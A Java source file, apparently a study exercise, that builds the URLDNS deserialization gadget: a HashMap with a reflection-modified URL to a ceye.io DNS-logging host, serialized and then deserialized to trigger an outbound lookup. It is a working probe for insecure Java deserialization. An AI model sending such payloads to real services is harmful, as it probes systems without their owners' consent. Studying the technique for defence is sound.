package v1f18.org;

import v1f18.org.util.SerializeUtil;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class main {
    public static void main(String[] args) throws Exception {
        String url = "http://juu7xg.ceye.io";
        urldns(url);
    }
    public static void urldns(String rurl) throws Exception {
        HashMap hashMap = new HashMap();
        Class<?> aClass = Class.forName("java.net.URL");
        Constructor<?> constructor = aClass.getConstructor(String.class);
        URL url = (URL) constructor.newInstance(rurl);
        //获取URL类中的hashCode属性
        Field hashCode = aClass.getDeclaredField("hashCode");
        //绕过权限限制
        hashCode.setAccessible(true);
        //设置hashCode的值
        hashCode.set(url,123);
        //添加到HashMap中
        hashMap.put(url,123);
        //设置hashCode的值
        hashCode.set(url,-1);
        SerializeUtil.writeObjectToFile(hashMap);
        SerializeUtil.readObjectToFile();
    }
}
